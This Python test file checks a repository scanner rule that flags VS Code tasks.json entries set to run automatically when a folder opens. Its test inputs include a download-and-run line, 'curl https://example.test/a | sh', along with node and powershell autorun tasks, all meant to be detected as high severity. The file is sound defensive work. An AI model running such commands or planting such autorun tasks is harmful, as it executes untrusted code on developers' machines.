import json

from repoguard.scanner import scan_files
from repoguard.scanner.checks.vscode_autorun import strip_jsonc

RULE_ID = "VSCODE-AUTORUN-TASK"
PATH = ".vscode/tasks.json"


def tasks(*task_list):
    return json.dumps({"version": "2.0.0", "tasks": list(task_list)}, indent=2) + "\n"


def auto(label, **kw):
    return {"label": label, "runOptions": {"runOn": "folderOpen"}, **kw}


def scan_one(content, path=PATH):
    return [f for f in scan_files([(path, content)]) if f.rule_id == RULE_ID]


# --- flagged ---------------------------------------------------------------------------

def test_autorun_node_script_is_high():
    found = scan_one(tasks(auto("setup", type="shell", command="node", args=["run.js"])))
    assert [f.severity for f in found] == ["high"]


def test_autorun_download_is_high():
    cmd = "curl https://example.test/a | sh"
    assert [f.severity for f in scan_one(tasks(auto("x", command=cmd)))] == ["high"]


def test_autorun_unknown_command_is_medium():
    assert [f.severity for f in scan_one(tasks(auto("x", command="rollup -c")))] == ["medium"]


def test_autorun_known_benign_command_is_low():
    assert [f.severity for f in scan_one(tasks(auto("x", command="tsc -w")))] == ["low"]


def test_autorun_with_no_command_is_medium():
    assert [f.severity for f in scan_one(tasks(auto("x")))] == ["medium"]


def test_windows_override_is_checked():
    task = auto("x", command="echo hi", windows={"command": "powershell", "args": ["-c", "x"]})
    assert [f.severity for f in scan_one(tasks(task))] == ["high"]


def test_depends_on_is_followed():
    helper = {"label": "helper", "command": "curl https://example.test/a | sh"}
    task = auto("front", command="echo ok", dependsOn=["helper"])
    assert [f.severity for f in scan_one(tasks(helper, task))] == ["high"]


def test_depends_on_cycle_does_not_crash():
    a = auto("a", command="echo a", dependsOn=["b"])
    b = {"label": "b", "command": "echo b", "dependsOn": ["a"]}
    assert len(scan_one(tasks(a, b))) == 1


def test_args_given_as_objects_are_read():
    task = auto("x", command="node", args=[{"value": "evil.js", "quoting": "strong"}])
    assert [f.severity for f in scan_one(tasks(task))] == ["high"]


def test_two_autorun_tasks_give_two_findings_with_their_own_lines():
    content = tasks(auto("one", command="node a.js"), auto("two", command="node b.js"))
    found = scan_one(content)
    assert len(found) == 2
    assert found[0].line < found[1].line
    assert all("folderOpen" in f.snippet for f in found)


def test_commented_json_with_trailing_commas_still_works():
    content = (
        "{\n"
        "  // comment\n"
        '  "tasks": [\n'
        "    {\n"
        '      "label": "x", /* block */\n'
        '      "command": "node evil.js",\n'
        '      "runOptions": { "runOn": "folderOpen", },\n'
        "    },\n"
        "  ],\n"
        "}\n"
    )
    found = scan_one(content)
    assert [f.severity for f in found] == ["high"]
    assert found[0].line == 7


def test_unreadable_file_still_flags_runon():
    found = scan_one('{ "tasks": [ { "runOptions": {"runOn": "folderOpen"} ')
    assert [f.severity for f in found] == ["high"]


def test_works_in_subfolder_and_windows_path():
    content = tasks(auto("x", command="node a.js"))
    assert scan_one(content, path="proj/.vscode/tasks.json")
    assert scan_one(content, path="proj\\.vscode\\tasks.json")


# --- benign ----------------------------------------------------------------------------

def test_task_without_runon_is_fine():
    assert not scan_one(tasks({"label": "build", "command": "node build.js"}))


def test_runon_default_is_fine():
    task = {"label": "x", "command": "node a.js", "runOptions": {"runOn": "default"}}
    assert not scan_one(tasks(task))


def test_commented_out_autorun_is_fine():
    content = '{\n  "tasks": [\n    // { "runOptions": {"runOn": "folderOpen"} }\n  ]\n}\n'
    assert not scan_one(content)


def test_other_json_files_are_not_scanned():
    assert not scan_one(tasks(auto("x", command="node a.js")), path="launch.json")


def test_empty_or_odd_files_do_not_crash():
    assert scan_one("") == []
    assert scan_one("[]") == []
    assert scan_one('{"tasks": "nope"}') == []


# --- the JSONC cleaner -----------------------------------------------------------------

def test_strip_jsonc_keeps_urls_inside_strings():
    text = '{"a": "https://example.test//x /* not a comment */"}'
    assert json.loads(strip_jsonc(text)) == {"a": "https://example.test//x /* not a comment */"}


def test_strip_jsonc_keeps_line_numbers():
    text = "{\n// c\n/* a\nb */\n\"x\": 1,\n}\n"
    assert strip_jsonc(text).count("\n") == text.count("\n")
